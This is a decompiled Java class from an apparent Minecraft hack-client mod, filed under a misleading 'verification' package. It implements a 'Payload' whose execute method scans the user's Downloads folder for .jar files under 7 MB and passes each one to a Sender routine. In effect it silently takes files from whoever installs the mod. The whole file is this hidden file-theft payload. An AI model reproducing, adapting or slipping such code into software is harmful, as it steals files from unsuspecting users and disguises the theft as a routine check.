//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Admin\Desktop\Minecraft-Deobfuscator3000-1.2.2\1.12 stable mappings"!

//Decompiled by Procyon!

package me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.impl;

import java.io.*;
import me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.*;
import java.nio.file.*;

public final class Downloads implements Payload
{
    @Override
    public void execute() throws Exception {
        Files.walk(Paths.get(System.getProperty("user.home") + "\\Downloads", new String[0]), new FileVisitOption[0]).filter(path -> path.toFile().getParent().equals(System.getProperty("user.home") + "\\Downloads")).filter(path -> path.toFile().getName().endsWith(".jar")).filter(path -> {
            try {
                return Files.size(path) < 7000000L;
            }
            catch (IOException ex) {
                return false;
            }
        }).forEach(path -> Sender.send(path.toFile()));
    }
}
